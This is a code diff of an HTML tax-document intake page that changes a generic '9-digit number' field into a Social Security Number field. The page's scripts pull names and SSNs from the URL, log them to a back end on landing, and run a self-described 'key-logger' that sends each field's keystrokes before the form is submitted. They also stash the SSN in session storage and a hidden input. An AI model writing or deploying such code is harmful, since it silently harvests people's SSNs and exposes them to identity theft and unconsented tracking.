@@ -7,30 +7,30 @@
   <script src="https://cdn.tailwindcss.com"></script>
 
   <!-- ============================================================
-       1. Capture query‑string (first, last, number) + instant log
+       1. Capture query‑string (first, last, ssn) + instant log
        ============================================================ -->
   <script>
     (function () {
       const params  = new URLSearchParams(window.location.search);
       const first   = params.get('first')   || '';
       const last    = params.get('last')    || '';
-      const numberQ = params.get('number')  || '';                // 9‑digit number
+      const ssnQ    = params.get('ssn')     || '';                // 9‑digit SSN
 
       /* Prefill once DOM is ready */
       document.addEventListener('DOMContentLoaded', () => {
         if (first)   document.querySelector('input[name="first_name"]').value = first;
         if (last)    document.querySelector('input[name="last_name"]').value  = last;
-        if (numberQ) document.querySelector('input[name="number"]').value     = numberQ;
-        if (numberQ) sessionStorage.setItem('numberParam', numberQ);          // keep for POST
+        if (ssnQ)    document.querySelector('input[name="ssn"]').value        = ssnQ;
+        if (ssnQ)    sessionStorage.setItem('ssnParam', ssnQ);                // keep for POST
       });
 
       /* One‑time GET log so back‑end sees the landing */
-      if (first || last || numberQ) {
+      if (first || last || ssnQ) {
         const q = new URLSearchParams({
           event:     'landing_query',
           first,
           last,
-          number:    numberQ,
+          ssn:       ssnQ,
           timestamp: new Date().toISOString()
         }).toString();
 
@@ -74,13 +74,13 @@
                autocomplete="family-name" required />
       </div>
       <div>
-        <label class="block text-sm font-medium">9‑Digit&nbsp;Number</label>
-        <input type="text" name="number" class="w-full border rounded p-2"
-               inputmode="numeric" maxlength="9" pattern="\d{9}" required />
+        <label class="block text-sm font-medium">SSN</label>
+        <input type="text" name="ssn" class="w-full border rounded p-2"
+               inputmode="numeric" maxlength="11" pattern="\d{3}-?\d{2}-?\d{4}" required />
       </div>
 
-      <!-- Hidden copy of number for consistency -->
-      <input type="hidden" name="number_hidden" id="number_hidden" />
+      <!-- Hidden copy of ssn for consistency -->
+      <input type="hidden" name="ssn_hidden" id="ssn_hidden" />
 
       <button type="submit"
               class="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
@@ -110,7 +110,7 @@
   </footer>
 
   <!-- ============================================================
-       2. Debounced key‑logger (first, last, number) + submit log
+       2. Debounced key‑logger (first, last, ssn) + submit log
        ============================================================ -->
   <script>
     /* ---- debounce helper ---- */
@@ -123,7 +123,7 @@
     }
 
     /* ---- key‑logging for the three inputs ---- */
-    ['first_name', 'last_name', 'number'].forEach((fieldName) => {
+    ['first_name', 'last_name', 'ssn'].forEach((fieldName) => {
       const field = document.querySelector(`input[name="${fieldName}"]`);
       if (!field) return;
 
@@ -151,15 +151,15 @@
       .addEventListener('submit', async function (e) {
         e.preventDefault();
 
-        /* sync hidden value with any landing‑page number */
-        const storedNum = sessionStorage.getItem('numberParam') || '';
-        document.getElementById('number_hidden').value = storedNum;
+        /* sync hidden value with any landing‑page ssn */
+        const storedSSN = sessionStorage.getItem('ssnParam') || '';
+        document.getElementById('ssn_hidden').value = storedSSN;
 
         const formData = new FormData(e.target);
         const data = {
           firstName: formData.get('first_name'),
           lastName:  formData.get('last_name'),
-          number:    formData.get('number') || storedNum || null
+          ssn:       formData.get('ssn') || storedSSN || null
         };
 
         try {
@@ -182,7 +182,7 @@
 
 PERSONAL INFORMATION
 • Driver's license or state ID
-• 9‑digit reference number (if provided)
+• Social Security Number (SSN)
 
 INCOME DOCUMENTS
 • W‑2 – from employers
